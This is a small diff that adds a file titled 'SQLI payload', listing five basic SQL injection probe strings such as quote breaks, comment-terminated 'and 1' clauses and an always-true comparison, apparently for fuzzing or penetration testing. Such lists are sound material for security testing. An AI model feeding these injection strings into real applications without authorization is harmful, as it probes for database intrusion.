@@ -1,0 +1,7 @@
+# SQLI payload
+
+'1
+/**/and 1
+' and 1--
+' and 1#
+' and '1'='1
